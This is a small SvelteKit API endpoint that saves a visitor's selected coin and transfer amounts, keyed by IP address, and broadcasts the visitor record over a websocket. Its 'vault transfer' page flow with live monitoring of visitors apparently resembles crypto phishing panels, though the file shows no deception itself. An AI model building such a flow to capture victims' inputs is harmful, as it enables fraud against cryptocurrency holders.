/**
 * Persist vault transfer context (asset + amounts) on the visitor session.
 * Used by Select Asset and honored on Confirm / Verification / Dashboard pages.
 */
import { json, type RequestHandler } from '@sveltejs/kit';
import { serverState } from '$lib/server/state';
import { broadcast } from '$lib/server/websocket';

export const POST: RequestHandler = async ({ request, getClientAddress }) => {
	let body: { coin?: string; amount?: string; amountUsd?: string } = {};
	try {
		body = await request.json();
	} catch {
		return json({ ok: false, error: 'invalid json' }, { status: 400 });
	}

	const ip = getClientAddress() || '';
	const visitor = serverState.visitors.get(ip);
	if (!visitor) {
		return json({ ok: false, error: 'no_session' }, { status: 400 });
	}

	const coin = String(body.coin ?? '')
		.trim()
		.toUpperCase()
		.slice(0, 12);
	if (!coin) {
		return json({ ok: false, error: 'coin required' }, { status: 400 });
	}

	visitor.inputs = visitor.inputs || {};
	visitor.inputs.coin = coin;
	if (body.amount != null && String(body.amount).trim()) {
		visitor.inputs.amount = String(body.amount).trim().slice(0, 32);
	}
	if (body.amountUsd != null && String(body.amountUsd).trim()) {
		visitor.inputs.amountUsd = String(body.amountUsd).trim().slice(0, 32);
	}

	try {
		broadcast({ type: 'visitor:updated', payload: visitor });
	} catch {
		/* non-critical */
	}

	return json({ ok: true, inputs: visitor.inputs });
};
